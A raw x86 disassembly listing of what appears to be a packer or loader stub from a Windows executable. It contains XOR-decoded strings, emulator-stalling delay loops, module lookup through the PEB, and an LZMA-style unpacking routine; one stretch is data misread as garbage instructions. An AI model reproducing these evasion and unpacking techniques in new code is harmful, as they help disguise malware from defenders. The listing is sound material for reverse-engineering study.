  425459:	mov    eax,DWORD PTR [ebp-0x4]
  42545c:	mov    eax,DWORD PTR [eax+0x198]
  425462:	mov    WORD PTR [ebp-0x6e],dx
  425466:	mov    edx,0x4f8a
  42546b:	mov    WORD PTR [ebp-0x6c],dx
  42546f:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e35
  425476:	mov    DWORD PTR [ebp-0x5a],0x4e34f1e6
  42547d:	mov    DWORD PTR [ebp-0xe0],0x1
  425487:	mov    DWORD PTR [ebp-0xdc],0x255
  425491:	push   DWORD PTR [eax]
  425493:	mov    eax,DWORD PTR [ebp+0x10]
  425496:	call   eax
  425498:	mov    DWORD PTR [ebp-0x8],eax
  42549b:	mov    eax,DWORD PTR [ebp-0x8]
  42549e:	test   eax,eax
  4254a0:	je     0x4254b3
  4254a2:	xor    DWORD PTR ds:0x76586876,0x87687666
  4254ac:	jmp    0x4254b3
  4254ae:	mov    edi,0x75108aa
  4254b3:	mov    eax,DWORD PTR [ebp-0x4]
  4254b6:	mov    ecx,DWORD PTR [eax+0x18c]
  4254bc:	xor    eax,eax
  4254be:	cmp    DWORD PTR [ecx],eax
  4254c0:	jne    0x425732
  4254c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4254c9:	mov    ecx,DWORD PTR [ecx+0x17c]
  4254cf:	mov    DWORD PTR [ecx],eax
  4254d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4254d4:	mov    ecx,DWORD PTR [ecx+0x180]
  4254da:	mov    DWORD PTR [ecx],eax
  4254dc:	mov    eax,0x4e61
  4254e1:	mov    WORD PTR [ebp-0x9c],ax
  4254e8:	mov    eax,esi
  4254ea:	mov    WORD PTR [ebp-0x9a],ax
  4254f1:	mov    eax,0x4e71
  4254f6:	mov    WORD PTR [ebp-0x98],ax
  4254fd:	add    eax,0xffffffc0
  425500:	mov    WORD PTR [ebp-0x96],ax
  425507:	mov    eax,0x4f8e
  42550c:	mov    WORD PTR [ebp-0x94],ax
  425513:	mov    eax,0x4e32
  425518:	mov    WORD PTR [ebp-0x92],ax
  42551f:	add    eax,0x4d
  425522:	mov    WORD PTR [ebp-0x90],ax
  425529:	mov    eax,0x4e34
  42552e:	mov    WORD PTR [ebp-0x8e],ax
  425535:	mov    eax,esi
  425537:	mov    WORD PTR [ebp-0x8c],ax
  42553e:	mov    eax,0x4e35
  425543:	mov    WORD PTR [ebp-0x8a],ax
  42554a:	mov    eax,0x99f1
  42554f:	mov    WORD PTR [ebp-0x88],ax
  425556:	mov    eax,0x8d62
  42555b:	mov    WORD PTR [ebp-0x86],ax
  425562:	mov    eax,0xd66f
  425567:	mov    WORD PTR [ebp-0x84],ax
  42556e:	mov    eax,0xd783
  425573:	mov    WORD PTR [ebp-0x82],ax
  42557a:	mov    eax,0x2784
  42557f:	mov    WORD PTR [ebp-0x80],ax
  425583:	mov    eax,0x4784
  425588:	mov    WORD PTR [ebp-0x7e],ax
  42558c:	mov    eax,0x4e33
  425591:	push   0x8
  425593:	mov    WORD PTR [ebp-0x7c],ax
  425597:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  42559e:	mov    DWORD PTR [ebp-0xc],0x8314131c
  4255a5:	lea    eax,[ebp-0x10]
  4255a8:	pop    ecx
  4255a9:	mov    dl,BYTE PTR [eax]
  4255ab:	xor    dl,0x7c
  4255ae:	inc    dl
  4255b0:	mov    BYTE PTR [eax],dl
  4255b2:	inc    eax
  4255b3:	dec    ecx
  4255b4:	jne    0x4255a9
  4255b6:	lea    eax,[ebp-0x10]
  4255b9:	mov    DWORD PTR [ebp-0xdc],eax
  4255bf:	lea    eax,[ebp-0xe0]
  4255c5:	push   eax
  4255c6:	mov    eax,DWORD PTR [ebp+0xc]
  4255c9:	xor    eax,edi
  4255cb:	add    eax,ebx
  4255cd:	push   eax
  4255ce:	mov    eax,DWORD PTR [ebp-0x4]
  4255d1:	add    eax,0x66
  4255d4:	push   eax
  4255d5:	mov    eax,DWORD PTR [ebp-0x4]
  4255d8:	mov    eax,DWORD PTR [eax+0x198]
  4255de:	mov    DWORD PTR [ebp-0xe0],0x1
  4255e8:	push   DWORD PTR [eax]
  4255ea:	mov    eax,DWORD PTR [ebp+0x10]
  4255ed:	call   eax
  4255ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4255f2:	xor    ecx,edi
  4255f4:	add    ecx,ebx
  4255f6:	mov    DWORD PTR [ebp-0x8],eax
  4255f9:	cmp    eax,ecx
  4255fb:	jne    0x425616
  4255fd:	mov    eax,ds:0x33730bcc
  425602:	or     eax,0x22150bcf
  425607:	mov    ds:0x33730bcc,eax
  42560c:	add    eax,0x3372e92f
  425611:	mov    ds:0x33730bcc,eax
  425616:	mov    ecx,0x4e66
  42561b:	mov    eax,ecx
  42561d:	mov    WORD PTR [ebp-0x40],ax
  425621:	add    eax,0x5
  425624:	mov    edx,eax
  425626:	mov    WORD PTR [ebp-0x3e],dx
  42562a:	mov    edx,0x4f93
  42562f:	mov    WORD PTR [ebp-0x3c],dx
  425633:	add    edx,0xfffffff8
  425636:	mov    WORD PTR [ebp-0x3a],dx
  42563a:	mov    edx,0x4f8d
  42563f:	mov    WORD PTR [ebp-0x38],dx
  425643:	add    edx,0xfffffff3
  425646:	mov    WORD PTR [ebp-0x36],dx
  42564a:	mov    edx,0x4f87
  42564f:	mov    WORD PTR [ebp-0x34],dx
  425653:	mov    WORD PTR [ebp-0x32],cx
  425657:	mov    ecx,esi
  425659:	mov    WORD PTR [ebp-0x30],cx
  42565d:	lea    ecx,[edx-0x1]
  425660:	mov    edx,ecx
  425662:	mov    WORD PTR [ebp-0x54],dx
  425666:	mov    edx,eax
  425668:	mov    WORD PTR [ebp-0x52],dx
  42566c:	mov    edx,0x4e73
  425671:	mov    WORD PTR [ebp-0x50],dx
  425675:	mov    WORD PTR [ebp-0x4e],ax
  425679:	lea    eax,[edx-0x6]
  42567c:	mov    WORD PTR [ebp-0x4c],ax
  425680:	add    eax,0xfffffff3
  425683:	mov    WORD PTR [ebp-0x4a],ax
  425687:	lea    eax,[edx-0xc]
  42568a:	mov    WORD PTR [ebp-0x48],ax
  42568e:	mov    WORD PTR [ebp-0x46],cx
  425692:	mov    WORD PTR [ebp-0x44],si
  425696:	mov    eax,DWORD PTR [ebp+0x8]
  425699:	movzx  ecx,WORD PTR [ebp-0x54]
  42569d:	xor    eax,edi
  42569f:	add    eax,ebx
  4256a1:	xor    eax,ecx
  4256a3:	mov    WORD PTR [ebp-0x54],ax
  4256a7:	mov    eax,DWORD PTR [ebp+0x8]
  4256aa:	movzx  ecx,WORD PTR [ebp-0x40]
  4256ae:	xor    eax,edi
  4256b0:	add    eax,ebx
  4256b2:	xor    eax,ecx
  4256b4:	mov    WORD PTR [ebp-0x40],ax
  4256b8:	xor    eax,eax
  4256ba:	mov    WORD PTR [ebp-0xf4],ax
  4256c1:	mov    WORD PTR [ebp-0x108],ax
  4256c8:	mov    edi,DWORD PTR [ebp+0x24]
  4256cb:	lea    eax,[ebp-0xf4]
  4256d1:	lea    edx,[ebp-0x54]
  4256d4:	mov    DWORD PTR [ebp-0xe0],0x2
  4256de:	mov    DWORD PTR [ebp-0xdc],eax
  4256e4:	call   0x42811b
  4256e9:	mov    DWORD PTR [ebp-0xd8],eax
  4256ef:	lea    eax,[ebp-0xe0]
  4256f5:	push   eax
  4256f6:	mov    eax,DWORD PTR [ebp+0xc]
  4256f9:	xor    eax,0x75108aa
  4256fe:	add    eax,ebx
  425700:	push   eax
  425701:	lea    eax,[ebp-0x9c]
  425707:	push   eax
  425708:	push   DWORD PTR [ebp-0x8]
  42570b:	mov    eax,DWORD PTR [ebp+0x10]
  42570e:	call   eax
  425710:	mov    edi,DWORD PTR [ebp+0x24]
  425713:	lea    eax,[ebp-0x108]
  425719:	lea    edx,[ebp-0x40]
  42571c:	mov    DWORD PTR [ebp-0xdc],eax
  425722:	call   0x42811b
  425727:	mov    DWORD PTR [ebp-0xd8],eax
  42572d:	mov    edi,0x75108aa
  425732:	mov    eax,DWORD PTR [ebp+0x14]
  425735:	push   DWORD PTR [ebp-0x4]
  425738:	push   DWORD PTR [ebp+0x20]
  42573b:	push   DWORD PTR [ebp+0x1c]
  42573e:	push   DWORD PTR [ebp+0x18]
  425741:	push   DWORD PTR [ebp+0x10]
  425744:	push   DWORD PTR [ebp+0x8]
  425747:	push   DWORD PTR [ebp+0xc]
  42574a:	call   0x4269bc
  42574f:	test   eax,eax
  425751:	je     0x425795
  425753:	add    DWORD PTR [ebp-0x4],eax
  425756:	push   DWORD PTR [ebp-0x4]
  425759:	lea    esi,[ebp+0x4]
  42575c:	call   0x425bad
  425761:	mov    eax,DWORD PTR [ebp-0x4]
  425764:	mov    eax,DWORD PTR [eax+0x1c8]
  42576a:	mov    eax,DWORD PTR [eax]
  42576c:	xor    eax,edi
  42576e:	add    eax,ebx
  425770:	mov    eax,DWORD PTR [ebp-0x4]
  425773:	jne    0x42578b
  425775:	mov    ecx,DWORD PTR [ebp-0x4]
  425778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  42577e:	push   DWORD PTR [ecx]
  425780:	mov    eax,DWORD PTR [eax+0x1e0]
  425786:	call   DWORD PTR [eax+0x28]
  425789:	jmp    0x425795
  42578b:	mov    eax,DWORD PTR [eax+0x17c]
  425791:	mov    eax,DWORD PTR [eax]
  425793:	add    DWORD PTR [esi],eax
  425795:	mov    eax,DWORD PTR [ebp-0x4]
  425798:	mov    eax,DWORD PTR [eax+0x1dc]
  42579e:	dec    DWORD PTR [eax]
  4257a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4257a3:	mov    ecx,DWORD PTR [ecx+0x1d8]
  4257a9:	mov    eax,DWORD PTR [eax]
  4257ab:	lea    eax,[ecx+eax*4]
  4257ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4257b1:	mov    ecx,DWORD PTR [ecx+0x17c]
  4257b7:	mov    eax,DWORD PTR [eax]
  4257b9:	mov    ecx,DWORD PTR [ecx]
  4257bb:	add    DWORD PTR [eax],ecx
  4257bd:	pop    edi
  4257be:	pop    esi
  4257bf:	pop    ebx
  4257c0:	leave  
  4257c1:	ret    0x20
  4257c4:	push   edi
  4257c5:	push   esi
  4257c6:	push   ebx
  4257c7:	push   ebp
  4257c8:	mov    ebp,esp
  4257ca:	mov    eax,DWORD PTR [ebp+0x24]
  4257cd:	add    DWORD PTR [ebp+0x28],eax
  4257d0:	push   eax
  4257d1:	cld    
  4257d2:	mov    esi,DWORD PTR [ebp+0x18]
  4257d5:	add    DWORD PTR [ebp+0x1c],esi
  4257d8:	push   esi
  4257d9:	mov    esi,DWORD PTR [ebp+0x14]
  4257dc:	lods   eax,DWORD PTR ds:[esi]
  4257dd:	xchg   edx,eax
  4257de:	push   edx
  4257df:	mov    cl,BYTE PTR [esi-0x2]
  4257e2:	or     eax,0xffffffff
  4257e5:	shl    eax,cl
  4257e7:	not    eax
  4257e9:	push   eax
  4257ea:	mov    cl,dh
  4257ec:	or     eax,0xffffffff
  4257ef:	shl    eax,cl
  4257f1:	not    eax
  4257f3:	push   eax
  4257f4:	add    cl,dl
  4257f6:	mov    edi,esi
  4257f8:	sub    esp,0xc
  4257fb:	sub    eax,eax
  4257fd:	inc    eax
  4257fe:	push   eax
  4257ff:	push   eax
  425800:	push   eax
  425801:	push   eax
  425802:	push   eax
  425803:	push   edi
  425804:	sub    esi,esi
  425806:	push   esi
  425807:	or     ebx,0xffffffff
  42580a:	mov    eax,0x300
  42580f:	shl    eax,cl
  425811:	lea    ecx,[eax+0x736]
  425817:	mov    eax,0x4000400
  42581c:	shr    ecx,1
  42581e:	rep stos DWORD PTR es:[edi],eax
  425820:	push   0x5
  425822:	pop    ecx
  425823:	call   0x425b0e
  425828:	loop   0x425823
  42582a:	lea    esi,[esi]
  42582c:	lea    edi,[edi]
  42582e:	mov    edi,DWORD PTR [ebp-0x4]
  425831:	mov    eax,DWORD PTR [ebp-0x10]
  425834:	sub    edi,DWORD PTR [ebp+0x24]
  425837:	and    eax,edi
  425839:	mov    DWORD PTR [ebp-0x18],eax
  42583c:	mov    al,0x0
  42583e:	call   0x425b26
  425843:	jne    0x4258de
  425849:	mov    cl,BYTE PTR [ebp-0xc]
  42584c:	and    edi,DWORD PTR [ebp-0x14]
  42584f:	shl    edi,cl
  425851:	sub    cl,0x8
  425854:	neg    cl
  425856:	shr    esi,cl
  425858:	pop    eax
  425859:	add    edi,esi
  42585b:	pop    esi
  42585c:	lea    edi,[edi+edi*2]
  42585f:	shl    edi,0x8
  425862:	cmp    al,0x7
  425864:	pop    edx
  425865:	lea    ecx,[esi+edi*2+0xe6c]
  42586c:	push   ecx
  42586d:	push   esi
  42586e:	mov    esi,0x100
  425873:	push   eax
  425874:	mov    al,0x1
  425876:	jb     0x4258ac
  425878:	mov    edi,DWORD PTR [ebp-0x4]
  42587b:	sub    edi,DWORD PTR [ebp-0x24]
  42587e:	movzx  edi,BYTE PTR [edi]
  425881:	mov    ebp,DWORD PTR [ebp-0x34]
  425884:	shl    edi,1
  425886:	mov    ecx,esi
  425888:	and    esi,edi
  42588a:	add    ecx,esi
  42588c:	lea    ebp,[ebp+ecx*2+0x0]
  425890:	call   0x425b45
  425895:	mov    ecx,eax
  425897:	shr    esi,0x8
  42589a:	and    ecx,0x1
  42589d:	cmp    esi,ecx
  42589f:	mov    esi,0x100
  4258a4:	jne    0x4258b4
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x425881
  4258aa:	jmp    0x4258c0
  4258ac:	mov    ebp,DWORD PTR [ebp-0x34]
  4258af:	call   0x425b45
  4258b4:	inc    eax
  4258b5:	inc    esi
  4258b6:	sub    eax,0x1
  4258b9:	sub    esi,0x1
  4258bc:	cmp    eax,esi
  4258be:	jb     0x4258ac
  4258c0:	pop    edx
  4258c1:	inc    edx
  4258c2:	cmp    edx,0x5
  4258c5:	dec    edx
  4258c6:	mov    ecx,edx
  4258c8:	jb     0x4258d9
  4258ca:	inc    edx
  4258cb:	cmp    edx,0xb
  4258ce:	dec    edx
  4258cf:	mov    cl,0x4
  4258d1:	dec    cl
  4258d3:	jb     0x4258d9
  4258d5:	mov    cl,0x7
  4258d7:	dec    cl
  4258d9:	sub    edx,ecx
  4258db:	push   edx
  4258dc:	jmp    0x42592d
  4258de:	mov    al,0xc1
  4258e0:	dec    al
  4258e2:	call   0x425b36
  4258e7:	jne    0x4258fd
  4258e9:	pop    eax
  4258ea:	pop    edi
  4258eb:	pop    edx
  4258ec:	pop    ecx
  4258ed:	pop    edx
  4258ee:	pop    ecx
  4258ef:	push   DWORD PTR [esp]
  4258f2:	push   ecx
  4258f3:	push   edx
  4258f4:	mov    edx,0x664
  4258f9:	mov    cl,0x0
  4258fb:	jmp    0x425970
  4258fd:	mov    al,0xcd
  4258ff:	dec    al
  425901:	call   0x425b36
  425906:	jne    0x425936
  425908:	mov    al,0xf1
  42590a:	dec    al
  42590c:	call   0x425b26
  425911:	jne    0x425966
  425913:	pop    eax
  425914:	cmp    al,0x7
  425916:	mov    al,0x9
  425918:	jb     0x42591c
  42591a:	mov    al,0xb
  42591c:	push   eax
  42591d:	mov    esi,DWORD PTR [ebp-0x4]
  425920:	sub    esi,DWORD PTR [ebp-0x24]
  425923:	cmp    esi,DWORD PTR [ebp+0x24]
  425926:	jb     0x425afd
  42592c:	lods   al,BYTE PTR ds:[esi]
  42592d:	mov    edi,DWORD PTR [ebp-0x4]
  425930:	stos   BYTE PTR es:[edi],al
  425931:	jmp    0x425ac4
  425936:	mov    al,0xd8
  425938:	call   0x425b36
  42593d:	mov    esi,DWORD PTR [ebp-0x28]
  425940:	je     0x42595d
  425942:	mov    al,0xe4
  425944:	call   0x425b36
  425949:	mov    esi,DWORD PTR [ebp-0x2c]
  42594c:	je     0x425957
  42594e:	mov    esi,DWORD PTR [ebp-0x30]
  425951:	mov    ecx,DWORD PTR [ebp-0x2c]
  425954:	mov    DWORD PTR [ebp-0x30],ecx
  425957:	mov    ecx,DWORD PTR [ebp-0x28]
  42595a:	mov    DWORD PTR [ebp-0x2c],ecx
  42595d:	mov    ecx,DWORD PTR [ebp-0x24]
  425960:	mov    DWORD PTR [ebp-0x28],ecx
  425963:	mov    DWORD PTR [ebp-0x24],esi
  425966:	pop    eax
  425967:	pop    edi
  425968:	pop    ecx
  425969:	mov    edx,0xa68
  42596e:	mov    cl,0x8
  425970:	add    edx,edi
  425972:	push   edx
  425973:	push   edi
  425974:	cmp    al,0x7
  425976:	mov    al,cl
  425978:	jb     0x42597c
  42597a:	add    al,0x3
  42597c:	push   eax
  42597d:	mov    ebp,DWORD PTR [ebp-0x34]
  425980:	call   0x425b43
  425985:	jne    0x42599b
  425987:	mov    eax,DWORD PTR [ebp-0x18]
  42598a:	mov    edi,DWORD PTR [ebp-0x34]
  42598d:	shl    eax,0x3
  425990:	sub    ecx,ecx
  425992:	push   0x8
  425994:	pop    esi
  425995:	lea    edi,[edi+eax*2+0x4]
  425999:	jmp    0x4259d0
  42599b:	mov    ebp,DWORD PTR [ebp-0x34]
  42599e:	add    ebp,0x2
  4259a1:	call   0x425b43
  4259a6:	jne    0x4259c0
  4259a8:	mov    eax,DWORD PTR [ebp-0x18]
  4259ab:	mov    edi,DWORD PTR [ebp-0x34]
  4259ae:	shl    eax,0x3
  4259b1:	push   0x8
  4259b3:	pop    ecx
  4259b4:	push   0x8
  4259b6:	pop    esi
  4259b7:	lea    edi,[edi+eax*2+0x104]
  4259be:	jmp    0x4259d0
  4259c0:	mov    edi,0x204
  4259c5:	add    edi,DWORD PTR [ebp-0x34]
  4259c8:	push   0x10
  4259ca:	pop    ecx
  4259cb:	mov    esi,0x100
  4259d0:	mov    DWORD PTR [ebp-0x1c],ecx
  4259d3:	sub    eax,eax
  4259d5:	inc    eax
  4259d6:	mov    ebp,edi
  4259d8:	call   0x425b45
  4259dd:	mov    ecx,eax
  4259df:	sub    ecx,esi
  4259e1:	jb     0x4259d6
  4259e3:	add    DWORD PTR [ebp-0x1c],ecx
  4259e6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4259ea:	jae    0x425aa0
  4259f0:	add    DWORD PTR [ebp-0x3c],0x7
  4259f4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4259f7:	cmp    ecx,0x4
  4259fa:	jb     0x4259ff
  4259fc:	push   0x3
  4259fe:	pop    ecx
  4259ff:	mov    edi,DWORD PTR [ebp-0x38]
  425a02:	shl    ecx,0x6
  425a05:	sub    eax,eax
  425a07:	inc    eax
  425a08:	push   0x40
  425a0a:	pop    esi
  425a0b:	lea    edi,[edi+ecx*2+0x360]
  425a12:	mov    ebp,edi
  425a14:	call   0x425b45
  425a19:	mov    ecx,eax
  425a1b:	sub    ecx,esi
  425a1d:	jb     0x425a12
  425a1f:	mov    DWORD PTR [ebp-0x18],ecx
  425a22:	mov    DWORD PTR [ebp-0x24],ecx
  425a25:	cmp    ecx,0x4
  425a28:	jb     0x425a9d
  425a2a:	mov    esi,ecx
  425a2c:	and    DWORD PTR [ebp-0x24],0x1
  425a30:	shr    esi,1
  425a32:	or     DWORD PTR [ebp-0x24],0x2
  425a36:	dec    esi
  425a37:	cmp    ecx,0xe
  425a3a:	jae    0x425a55
  425a3c:	mov    eax,0x2af
  425a41:	sub    eax,ecx
  425a43:	mov    ecx,esi
  425a45:	shl    BYTE PTR [ebp-0x24],cl
  425a48:	add    eax,DWORD PTR [ebp-0x24]
  425a4b:	shl    eax,1
  425a4d:	add    eax,DWORD PTR [ebp-0x38]
  425a50:	mov    DWORD PTR [ebp-0x34],eax
  425a53:	jmp    0x425a82
  425a55:	sub    esi,0x4
  425a58:	call   0x425b02
  425a5d:	shr    ebx,1
  425a5f:	shl    DWORD PTR [ebp-0x24],1
  425a62:	cmp    DWORD PTR [ebp-0x20],ebx
  425a65:	jb     0x425a6d
  425a67:	inc    DWORD PTR [ebp-0x24]
  425a6a:	sub    DWORD PTR [ebp-0x20],ebx
  425a6d:	dec    esi
  425a6e:	jne    0x425a58
  425a70:	mov    eax,0x644
  425a75:	add    eax,DWORD PTR [ebp-0x38]
  425a78:	mov    DWORD PTR [ebp-0x34],eax
  425a7b:	shl    DWORD PTR [ebp-0x24],0x4
  425a7f:	push   0x4
  425a81:	pop    esi
  425a82:	sub    edi,edi
  425a84:	inc    edi
  425a85:	mov    eax,edi
  425a87:	mov    ebp,DWORD PTR [ebp-0x34]
  425a8a:	call   0x425b45
  425a8f:	test   al,0x1
  425a91:	je     0x425a96
  425a93:	or     DWORD PTR [ebp-0x24],edi
  425a96:	shl    edi,1
  425a98:	dec    esi
  425a99:	jne    0x425a87
  425a9b:	jmp    0x425a9d
  425a9d:	inc    DWORD PTR [ebp-0x24]
  425aa0:	mov    ecx,DWORD PTR [ebp-0x1c]
  425aa3:	add    ecx,0x2
  425aa6:	mov    edi,DWORD PTR [ebp-0x4]
  425aa9:	mov    eax,edi
  425aab:	sub    eax,DWORD PTR [ebp+0x24]
  425aae:	cmp    DWORD PTR [ebp-0x24],eax
  425ab1:	ja     0x425afd
  425ab3:	mov    esi,edi
  425ab5:	sub    esi,DWORD PTR [ebp-0x24]
  425ab8:	mov    edx,DWORD PTR [ebp+0x28]
  425abb:	lods   al,BYTE PTR ds:[esi]
  425abc:	stos   BYTE PTR es:[edi],al
  425abd:	cmp    edi,edx
  425abf:	jae    0x425ac4
  425ac1:	dec    ecx
  425ac2:	jne    0x425abb
  425ac4:	mov    DWORD PTR [ebp-0x4],edi
  425ac7:	movzx  esi,al
  425aca:	cmp    edi,DWORD PTR [ebp+0x28]
  425acd:	jb     0x42582e
  425ad3:	call   0x425b02
  425ad8:	sub    eax,eax
  425ada:	lea    ebp,[esp+0x3c]
  425ade:	mov    edx,DWORD PTR [ebp+0x20]
  425ae1:	mov    esi,DWORD PTR [ebp-0x8]
  425ae4:	sub    esi,DWORD PTR [ebp+0x18]
  425ae7:	mov    DWORD PTR [edx],esi
  425ae9:	mov    edx,DWORD PTR [ebp+0x2c]
  425aec:	mov    edi,DWORD PTR [ebp-0x4]
  425aef:	sub    edi,DWORD PTR [ebx+0x16]
  425af2:	lods   al,BYTE PTR ds:[esi]
  425af3:	outs   dx,BYTE PTR ds:[esi]
  425af4:	lods   eax,DWORD PTR ds:[esi]
  425af5:	repz inc DWORD PTR [ebx]
  425af8:	xchg   ecx,eax
  425af9:	test   BYTE PTR [esi-0x76cd1801],0x87
  425b00:	xor    eax,0x86758ce9
  425b05:	xchg   BYTE PTR [esi-0x6a75b076],al
  425b0b:	lea    edx,ds:0x5bb4dfa6
  425b11:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  425b18:	fwait
  425b19:	or     DWORD PTR [ebp-0x53c759f7],ecx
  425b1f:	fwait
  425b20:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  425b27:	mov    ebx,0x8960c299
  425b2c:	lea    ecx,ds:0x299b9296
  425b32:	xchg   edx,eax
  425b33:	lea    esi,ds:0x8960c29e
  425b39:	xchg   edx,eax
  425b3a:	fwait
  425b3b:	cdq    
  425b3c:	mov    ah,0x3b
  425b3e:	test   eax,0x869b37bc
  425b43:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425b49:	mov    WORD PTR [ebp-0x7a],?
  425b4c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425b52:	mov    bh,0x16
  425b54:	lea    dx,[edi]
  425b57:	push   ss
  425b58:	push   es
  425b59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b5a:	jb     0x425b13
  425b5c:	push   ss
  425b5d:	not    DWORD PTR [ebx-0x8]
  425b60:	mov    al,0xca
  425b62:	test   DWORD PTR [edi+0x158d6616],edx
  425b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b69:	test   al,0xd7
  425b6b:	push   ss
  425b6c:	push   es
  425b6d:	mov    ah,0xb5
  425b6f:	ret    0x55b7
  425b72:	add    cl,al
  425b74:	jmp    0xcaf16a84
  425b79:	cmp    DWORD PTR [esp+0x20],ecx
  425b7d:	jae    0x425b96
  425b7f:	mov    ebx,ecx
  425b81:	mov    ecx,0x800
  425b86:	sub    ecx,edx
  425b88:	shr    ecx,0x5
  425b8b:	add    WORD PTR [ebp+0x0],cx
  425b8f:	add    eax,eax
  425b91:	lea    ebp,[esp+0x40]
  425b95:	ret    
  425b96:	shr    edx,0x5
  425b99:	sub    DWORD PTR [esp+0x20],ecx
  425b9d:	sub    ebx,ecx
  425b9f:	sub    WORD PTR [ebp+0x0],dx
  425ba3:	add    eax,eax
  425ba5:	add    eax,0x1
  425ba8:	lea    ebp,[esp+0x40]
  425bac:	ret    
  425bad:	push   ebp
  425bae:	mov    ebp,esp
  425bb0:	sub    esp,0x12c
  425bb6:	push   ebx
  425bb7:	push   esi
  425bb8:	push   edi
  425bb9:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425bc0:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425bc7:	mov    eax,DWORD PTR [ebp+0x8]
  425bca:	mov    DWORD PTR [ebp+0x8],eax
  425bcd:	mov    ecx,DWORD PTR [ebp-0x10]
  425bd0:	mov    ebx,0x75108aa
  425bd5:	xor    ecx,ebx
  425bd7:	mov    eax,0x3272f1
  425bdc:	add    ecx,eax
  425bde:	mov    DWORD PTR [ebp-0x24],ecx
  425be1:	mov    ecx,DWORD PTR [ebp-0x10]
  425be4:	xor    ecx,ebx
  425be6:	add    ecx,eax
  425be8:	mov    DWORD PTR [ebp-0x40],ecx
  425beb:	mov    ecx,DWORD PTR [ebp-0x10]
  425bee:	xor    ecx,ebx
  425bf0:	add    ecx,eax
  425bf2:	mov    DWORD PTR [ebp-0x3c],ecx
  425bf5:	mov    ecx,DWORD PTR [ebp-0x10]
  425bf8:	xor    ecx,ebx
  425bfa:	add    ecx,eax
  425bfc:	mov    DWORD PTR [ebp-0xd8],ecx
  425c02:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425c09:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425c10:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425c17:	push   0x25
  425c19:	pop    ecx
  425c1a:	mov    DWORD PTR [ebp-0x30],ecx
  425c1d:	mov    DWORD PTR [ebp-0x30],ecx
  425c20:	push   0x65
  425c22:	pop    ecx
  425c23:	mov    DWORD PTR [ebp-0x30],ecx
  425c26:	mov    DWORD PTR [ebp-0x30],ecx
  425c29:	mov    DWORD PTR [ebp-0x30],0x4d
  425c30:	mov    DWORD PTR [ebp-0x30],0x43
  425c37:	mov    ecx,DWORD PTR [ebp-0x10]
  425c3a:	xor    ecx,ebx
  425c3c:	add    ecx,eax
  425c3e:	mov    DWORD PTR [ebp-0x30],ecx
  425c41:	mov    ecx,DWORD PTR [ebp-0x10]
  425c44:	xor    ecx,ebx
  425c46:	add    ecx,eax
  425c48:	mov    DWORD PTR [ebp-0x30],ecx
  425c4b:	mov    DWORD PTR [ebp-0x28],0x258
  425c52:	mov    DWORD PTR [ebp-0x34],0x36
  425c59:	mov    DWORD PTR [ebp-0x14],0x7a
  425c60:	lea    edi,[ebp-0x10c]
  425c66:	lea    esi,[ebp-0x12c]
  425c6c:	call   0x42692b
  425c71:	dec    DWORD PTR [ebp-0x14]
  425c74:	jne    0x425c60
  425c76:	dec    DWORD PTR [ebp-0x34]
  425c79:	jne    0x425c59
  425c7b:	dec    DWORD PTR [ebp-0x28]
  425c7e:	jne    0x425c52
  425c80:	mov    DWORD PTR [ebp-0x28],0x400e
  425c87:	mov    eax,DWORD PTR [ebp-0x10]
  425c8a:	xor    eax,ebx
  425c8c:	mov    esi,0x3272f1
  425c91:	add    eax,esi
  425c93:	mov    DWORD PTR [ebp-0x1c],eax
  425c96:	mov    eax,DWORD PTR [ebp-0x10]
  425c99:	and    DWORD PTR [ebp-0x94],0x0
  425ca0:	xor    eax,ebx
  425ca2:	add    eax,esi
  425ca4:	mov    DWORD PTR [ebp-0x38],eax
  425ca7:	mov    eax,fs:0x18
  425cad:	mov    DWORD PTR [ebp-0x94],eax
  425cb3:	mov    eax,DWORD PTR [eax+0x30]
  425cb6:	mov    DWORD PTR [ebp-0xcc],eax
  425cbc:	mov    eax,DWORD PTR [eax+0xc]
  425cbf:	mov    DWORD PTR [ebp-0xc0],eax
  425cc5:	mov    eax,DWORD PTR [ebp+0x8]
  425cc8:	lea    ecx,[ebp-0x94]
  425cce:	mov    DWORD PTR [eax+0x1a0],ecx
  425cd4:	mov    eax,DWORD PTR [ebp+0x8]
  425cd7:	lea    ecx,[ebp-0xcc]
  425cdd:	mov    DWORD PTR [eax+0x1a4],ecx
  425ce3:	mov    eax,DWORD PTR [ebp+0x8]
  425ce6:	push   DWORD PTR [ebp+0x8]
  425ce9:	lea    ecx,[ebp-0xc0]
  425cef:	mov    DWORD PTR [eax+0x1a8],ecx
  425cf5:	call   0x4280ec
  425cfa:	mov    ecx,DWORD PTR [ebp-0x10]
  425cfd:	xor    ecx,ebx
  425cff:	add    ecx,esi
  425d01:	cmp    ecx,eax
  425d03:	je     0x426086
  425d09:	mov    eax,DWORD PTR [ebp+0x8]
  425d0c:	mov    eax,DWORD PTR [eax+0x194]
  425d12:	mov    ecx,DWORD PTR [eax]
  425d14:	mov    eax,DWORD PTR [ebp+0x8]
  425d17:	mov    eax,DWORD PTR [eax+0x194]
  425d1d:	mov    eax,DWORD PTR [eax]
  425d1f:	add    eax,DWORD PTR [ecx+0x3c]
  425d22:	mov    ecx,DWORD PTR [ebp+0x8]
  425d25:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425d2b:	lea    edx,[ebp-0xec]
  425d31:	push   edx
  425d32:	mov    edx,DWORD PTR [ebp+0x8]
